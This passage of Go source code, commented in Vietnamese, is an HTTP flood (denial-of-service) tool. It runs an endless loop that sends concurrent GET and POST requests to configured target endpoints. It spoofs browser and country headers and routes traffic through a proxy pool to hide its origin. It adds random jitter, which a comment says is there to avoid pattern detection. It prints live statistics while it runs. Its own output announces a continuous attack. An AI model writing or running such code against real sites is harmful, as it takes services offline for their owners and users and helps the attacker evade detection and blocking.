		getReq.Header.Set("Sec-Fetch-Site", "none")
		getReq.Header.Set("Sec-Fetch-User", "?1")
		getReq.Header.Set("Sec-Ch-Ua", "\"Chromium\";v=\"122\", \"Not(A:Brand\";v=\"24\", \"Google Chrome\";v=\"122\"")
		getReq.Header.Set("Sec-Ch-Ua-Mobile", "?0")
		getReq.Header.Set("Sec-Ch-Ua-Platform", "\"Windows\"")
	}

	// 80% giả mạo trình duyệt từ Việt Nam
	if rand.Intn(10) < 8 {
		getReq.Header.Set("Accept-Language", "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7")
		getReq.Header.Set("X-Country-Code", "VN")
	} else {
		// 20% giả mạo trình duyệt từ nước khác
		switch rand.Intn(5) {
		case 0:
			// Giả mạo trình duyệt từ Singapore
			getReq.Header.Set("Accept-Language", "en-SG,en;q=0.9,zh-SG;q=0.8")
			getReq.Header.Set("X-Country-Code", "SG")
		case 1:
			// Giả mạo trình duyệt từ Thái Lan
			getReq.Header.Set("Accept-Language", "th-TH,th;q=0.9,en;q=0.8")
			getReq.Header.Set("X-Country-Code", "TH")
		case 2:
			// Giả mạo trình duyệt từ Malaysia
			getReq.Header.Set("Accept-Language", "en-MY,en;q=0.9,ms;q=0.8")
			getReq.Header.Set("X-Country-Code", "MY")
		case 3:
			// Giả mạo trình duyệt từ Nhật Bản
			getReq.Header.Set("Accept-Language", "ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7")
			getReq.Header.Set("X-Country-Code", "JP")
		case 4:
			// Giả mạo trình duyệt từ Hàn Quốc
			getReq.Header.Set("Accept-Language", "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7")
			getReq.Header.Set("X-Country-Code", "KR")
		}
	}

	// Thực hiện request
	getResp, err := client.Do(getReq)
	if err != nil {
		fmt.Printf("Lỗi khi gửi GET từ client %d (bypass attempt %d): %v\n", clientID, attempt, err)
		return false
	}
	defer getResp.Body.Close()
	fmt.Printf("Client %d (GET bypass attempt %d) nhận phản hồi: %s\n", clientID, attempt, getResp.Status)

	// Kiểm tra status code
	if getResp.StatusCode < 200 || getResp.StatusCode >= 300 {
		fmt.Printf("Client %d (GET bypass attempt %d) nhận status code không thành công: %d\n", clientID, attempt, getResp.StatusCode)
	}

	// POST request với headers tương tự
	postData := bytes.NewBuffer([]byte(`{"name":"TestUser","message":"Test message"}`))
	postReq, err := http.NewRequest("POST", endpoint, postData)
	if err != nil {
		fmt.Printf("Lỗi khi tạo POST từ client %d: %v\n", clientID, err)
		return false
	}

	// Copy tất cả headers từ GET request
	for key, values := range getReq.Header {
		for _, value := range values {
			postReq.Header.Add(key, value)
		}
	}
	postReq.Header.Set("Content-Type", "application/json")

	// Thực hiện POST
	postResp, err := client.Do(postReq)
	if err != nil {
		fmt.Printf("Lỗi khi gửi POST từ client %d (bypass attempt %d): %v\n", clientID, attempt, err)
		return false
	}
	defer postResp.Body.Close()
	fmt.Printf("Client %d (POST bypass attempt %d) nhận phản hồi: %s\n", clientID, attempt, postResp.Status)

	// Kiểm tra status code
	if postResp.StatusCode < 200 || postResp.StatusCode >= 300 {
		fmt.Printf("Client %d (POST bypass attempt %d) nhận status code không thành công: %d\n", clientID, attempt, postResp.StatusCode)
	}

	// Cập nhật thống kê - thành công
	duration := time.Since(start)
	atomic.AddInt64(&stats.successCount, 1)
	atomic.AddInt64(&stats.totalDuration, int64(duration))

	// Độ trễ ngẫu nhiên
	delay := time.Duration(rand.Intn(300)+50) * time.Millisecond
	time.Sleep(delay)

	return true
}

func main() {
	// =============================================
	// TỰ ĐỘNG ĐỌC CẤU HÌNH TỪ FILE CONFIG.TXT
	// =============================================

	fmt.Println("📖 Đang đọc cấu hình từ file config.txt...")
	config, err := loadConfig("config.txt")
	if err != nil {
		fmt.Printf("⚠️  Lỗi đọc config: %v, sử dụng cấu hình mặc định\n", err)
	}

	// Sử dụng cấu hình từ file
	TARGET_SERVER := config.TargetServer
	TARGET_PORT := config.TargetPort
	PROTOCOL := config.Protocol
	TARGET_ENDPOINTS := config.Endpoints
	maxConcurrent := config.MaxConcurrent
	delayMs := config.DelayMs

	// =============================================
	// TỰ ĐỘNG TẠO FULL URLs TỪ CẤU HÌNH
	// =============================================

	var endpoints []string

	// Tạo full URLs từ cấu hình
	for _, endpoint := range TARGET_ENDPOINTS {
		if TARGET_PORT == "443" && PROTOCOL == "https" {
			// HTTPS port 443 không cần ghi port
			endpoints = append(endpoints, fmt.Sprintf("%s://%s%s", PROTOCOL, TARGET_SERVER, endpoint))
		} else if TARGET_PORT == "80" && PROTOCOL == "http" {
			// HTTP port 80 không cần ghi port
			endpoints = append(endpoints, fmt.Sprintf("%s://%s%s", PROTOCOL, TARGET_SERVER, endpoint))
		} else {
			// Các port khác cần ghi rõ
			endpoints = append(endpoints, fmt.Sprintf("%s://%s:%s%s", PROTOCOL, TARGET_SERVER, TARGET_PORT, endpoint))
		}
	}

	// Khởi tạo thống kê
	stats := &Stats{}

	// Đọc danh sách proxy
	proxyPool, err := loadProxies("proxies.txt")
	if err != nil {
		fmt.Printf("⚠️ Lỗi khi đọc file proxy: %v - Tiếp tục với kết nối trực tiếp\n", err)
	}

	if proxyPool == nil || len(proxyPool.proxies) == 0 {
		fmt.Println("⚠️ Không có proxy nào được tải - Sẽ sử dụng kết nối trực tiếp (IP thật)")
	} else {
		fmt.Printf("✅ Đã tải %d proxy từ file\n", len(proxyPool.proxies))
	}

	fmt.Printf("🎯 TARGET: %s:%s (%s)\n", TARGET_SERVER, TARGET_PORT, PROTOCOL)
	fmt.Printf("📍 ENDPOINTS: %v\n", TARGET_ENDPOINTS)
	fmt.Printf("🚀 BẮT ĐẦU TẤN CÔNG LIÊN TỤC VỚI CHẾ ĐỘ HỖN HỢP (PROXY + IP THẬT)!\n")
	fmt.Printf("💪 ĐA LUỒNG: %d kết nối đồng thời\n", maxConcurrent)
	fmt.Printf("🔄 PROXY POOL: %d proxy với quản lý sức khỏe tự động\n", len(proxyPool.proxies))
	fmt.Println("⚠️  Nhấn Ctrl+C để dừng chương trình")

	start := time.Now()

	// Tạo hai channel cho hai loại kết nối
	jobChan := make(chan struct {
		clientID int
		endpoint string
	}, maxConcurrent*2)
	semaphore := make(chan struct{}, maxConcurrent) // Channel để giới hạn goroutines

	// Khởi tạo biến đếm goroutine hiện tại
	var activeRequests int32 = 0

	// In thống kê mỗi 30 giây
	go func() {
		ticker := time.NewTicker(30 * time.Second)
		defer ticker.Stop()

		// Biến để theo dõi hiệu suất
		var lastSuccessCount int64 = 0
		var lastErrorCount int64 = 0
		var lastTotalRequests int64 = 0
		var lastTime = time.Now()

		for {
			select {
			case <-ticker.C:
				now := time.Now()
				totalTime := now.Sub(start)
				elapsedSince := now.Sub(lastTime)

				// Tính tốc độ hiện tại
				currentSuccessCount := atomic.LoadInt64(&stats.successCount)
				currentErrorCount := atomic.LoadInt64(&stats.errorCount)
				currentTotalRequests := atomic.LoadInt64(&stats.totalRequests)

				successRate := float64(currentSuccessCount-lastSuccessCount) / elapsedSince.Seconds()
				errorRate := float64(currentErrorCount-lastErrorCount) / elapsedSince.Seconds()
				requestRate := float64(currentTotalRequests-lastTotalRequests) / elapsedSince.Seconds()

				// Cập nhật giá trị cho lần sau
				lastSuccessCount = currentSuccessCount
				lastErrorCount = currentErrorCount
				lastTotalRequests = currentTotalRequests
				lastTime = now

				// Tính hiệu suất
				var successPercentage float64 = 0
				if currentTotalRequests > 0 {
					successPercentage = float64(currentSuccessCount) / float64(currentTotalRequests) * 100
				}

				// Đếm proxy khả dụng
				var availableProxies int = 0
				if proxyPool != nil {
					proxyPool.mutex.Lock()
					for i := range proxyPool.proxies {
						if proxyPool.proxies[i].isAvailable() {
							availableProxies++
						}
					}
					proxyPool.mutex.Unlock()
				}

				// Hiển thị thống kê chi tiết hơn
				fmt.Printf("\n=== THỐNG KÊ HIỆN TẠI (sau %v) ===\n", totalTime)
				fmt.Printf("Tổng số requests: %d (%.2f requests/giây)\n",
					currentTotalRequests, requestRate)
				fmt.Printf("Thành công: %d (%.2f/giây - %.2f%%)\n",
					currentSuccessCount, successRate, successPercentage)
				fmt.Printf("Lỗi: %d (%.2f/giây)\n",
					currentErrorCount, errorRate)
				fmt.Printf("Sử dụng proxy: %d\n", atomic.LoadInt64(&stats.proxyUsedCount))
				fmt.Printf("Kết nối trực tiếp: %d\n", atomic.LoadInt64(&stats.directUsedCount))
				fmt.Printf("Số luồng đang hoạt động: %d (max: %d/%d)\n",
					atomic.LoadInt32(&activeRequests),
					atomic.LoadInt32(&stats.maxGoroutines),
					maxConcurrent)

				if proxyPool != nil {
					fmt.Printf("Proxy khả dụng: %d/%d\n",
						availableProxies, len(proxyPool.proxies))
				}

				if stats.successCount > 0 {
					avgDuration := time.Duration(atomic.LoadInt64(&stats.totalDuration) / atomic.LoadInt64(&stats.successCount))
					fmt.Printf("Thời gian phản hồi trung bình: %v\n", avgDuration)
				}
				fmt.Println("=======================================")

				// Tính lại số worker nên có dựa trên hiệu suất
				// Tự động tăng số worker nếu tỉ lệ thành công cao
				// Giảm số worker nếu tỉ lệ lỗi cao
			}
		}
	}()

	// Khởi tạo worker pool - cách hiệu quả hơn để quản lý goroutines
	// Số lượng worker bằng với maxConcurrent
	for i := 0; i < maxConcurrent; i++ {
		go func(workerID int) {
			for job := range jobChan {
				// Đánh dấu một goroutine đang hoạt động
				current := atomic.AddInt32(&activeRequests, 1)

				// Cập nhật số lượng goroutine tối đa
				for {
					max := atomic.LoadInt32(&stats.maxGoroutines)
					if current <= max {
						break
					}
					if atomic.CompareAndSwapInt32(&stats.maxGoroutines, max, current) {
						break
					}
				}

				semaphore <- struct{}{} // Chiếm một slot

				// Thực hiện công việc
				var dummyWG sync.WaitGroup
				dummyWG.Add(1)
				sendHTTPRequest(job.endpoint, job.clientID, stats, &dummyWG, proxyPool)

				// Giải phóng tài nguyên
				<-semaphore
				atomic.AddInt32(&activeRequests, -1)
			}
		}(i)
	}

	// Vòng lặp vô hạn - gửi requests liên tục
	clientID := 1
	for {
		// Chọn endpoint ngẫu nhiên để tấn công
		endpoint := endpoints[rand.Intn(len(endpoints))]

		// Gửi công việc vào channel
		select {
		case jobChan <- struct {
			clientID int
			endpoint string
		}{clientID: clientID, endpoint: endpoint}:
			// Công việc đã được đưa vào hàng đợi
		default:
			// Nếu channel đầy, đợi một chút rồi thử lại
			time.Sleep(time.Duration(rand.Intn(10)+1) * time.Millisecond)
			continue
		}

		clientID++

		// Delay nhỏ với độ jitter ngẫu nhiên để tránh quá tải và khó phát hiện mẫu
		if delayMs > 0 && clientID%(maxConcurrent/2) == 0 {
			jitterDelay := time.Duration(rand.Intn(delayMs*2)+1) * time.Millisecond
			time.Sleep(jitterDelay)
		}
	}
}
